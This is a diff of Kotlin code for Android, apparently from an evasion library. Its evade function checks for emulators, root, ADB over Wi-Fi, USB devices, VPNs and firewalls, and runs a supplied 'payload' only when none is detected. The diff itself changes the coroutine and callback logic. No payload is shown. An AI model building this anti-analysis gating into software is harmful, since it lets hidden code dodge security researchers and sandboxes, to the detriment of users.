@@ -69,9 +69,9 @@ import javax.net.SocketFactory
  * [Manifest.permission.ACCESS_NETWORK_STATE], and [Manifest.permission.ACCESS_WIFI_STATE] will be merged into your app's Android.manifest file
  * when compiling.
  **/
-inline suspend fun Context.evade(dispatcher: CoroutineDispatcher = Dispatchers.Default, requiresNetwork: Boolean = true, crossinline payload: () -> Unit): OnEvade.Escape{
-    lateinit var onEvade: OnEvade.Escape
-    withContext(dispatcher){
+inline suspend fun Context.evade(requiresNetwork: Boolean = true, crossinline payload: suspend () -> Unit): OnEvade.Escape{
+    var evaded = false
+    withContext(Dispatchers.Default){
         val isEmulator = async { isEmulator }
         val isRooted = async { isRooted() }
         val hasAdbOverWifi = async { hasAdbOverWifi() }
@@ -85,27 +85,24 @@ inline suspend fun Context.evade(dispatcher: CoroutineDispatcher = Dispatchers.D
             if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                 hasVpn = async { hasVPN() }
         }
-        if( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !(hasVpn?.let { it.await() } ?: false) && !(hasFirewall?.let { it.await() } ?: false)){
-            launch { payload() }.join()
-            onEvade = OnEvade.Escape(true)
-        }
-        else
-            onEvade = OnEvade.Escape(false)
+        evaded = !( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !(hasVpn?.let { it.await() } ?: false) && !(hasFirewall?.let { it.await() } ?: false))
     }
-    return onEvade
+    if(!evaded)
+        payload()
+    return OnEvade.Escape(evaded)
 }
 
 class OnEvade{
     class Success(val result: Boolean): Result{
-        fun onSuccess(callback: () -> Unit): Escape{
-            if(this.result)
+        suspend fun onSuccess(callback: suspend () -> Unit): Escape{
+            if(!this.result)
                 callback()
             return Escape(this.result)
         }
     }
     class Escape(val result: Boolean): Result{
-        fun onEscape(callback: () -> Unit): Success{
-            if(!this.result)
+        suspend fun onEscape(callback: suspend () -> Unit): Success{
+            if(this.result)
                 callback()
             return Success(this.result)
         }
